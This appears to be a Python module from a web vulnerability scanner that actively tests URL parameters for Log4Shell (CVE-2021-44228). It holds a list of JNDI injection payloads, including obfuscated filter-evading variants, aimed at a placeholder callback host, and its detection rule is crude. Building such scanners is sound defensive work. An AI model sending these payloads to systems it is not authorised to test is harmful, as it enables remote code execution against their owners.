import httpx
from modules.scanner.base_check import BaseCheck, CheckResult
from urllib.parse import urlparse, parse_qsl, urlencode


LOG4SHELL_PAYLOADS = [
    "${jndi:ldap://collaborator/exploit}",
    "${jndi:rmi://collaborator/exploit}",
    "${jndi:dns://collaborator/exploit}",
    "${${lower:j}ndi:${lower:l}da${lower:p}://collaborator}",
    "${${env:ENV_NAME:-j}ndi:${env:ENV_NAME:-l}dap://collaborator}",
]


class ActiveLog4shellCheck(BaseCheck):
    name = "active_log4shell"

    async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
        results = []
        async with httpx.AsyncClient(verify=False, timeout=15) as client:
            for param in target_params:
                for payload in LOG4SHELL_PAYLOADS:
                    modified = dict(base_request)
                    parsed = urlparse(modified["url"])
                    params = dict(parse_qsl(parsed.query))
                    if param in params:
                        params[param] = payload
                        modified["url"] = parsed._replace(query=urlencode(params)).geturl()
                        try:
                            resp = await client.request(**modified)
                            if resp.status_code in (500, 502) or "${" in resp.text:
                                results.append(CheckResult(
                                    triggered=True,
                                    severity="critical",
                                    title="Log4Shell Vulnerability (CVE-2021-44228)",
                                    description=f"Parameter '{param}' may be vulnerable to Log4Shell JNDI injection.",
                                    evidence=f"Payload: {payload}\nStatus: {resp.status_code}",
                                    remediation="Update Log4j to 2.17.0+. Set log4j2.formatMsgNoLookups=true. Apply CVE-2021-44228 patches.",
                                    cwe="CWE-917",
                                ))
                        except Exception:
                            continue
        return results
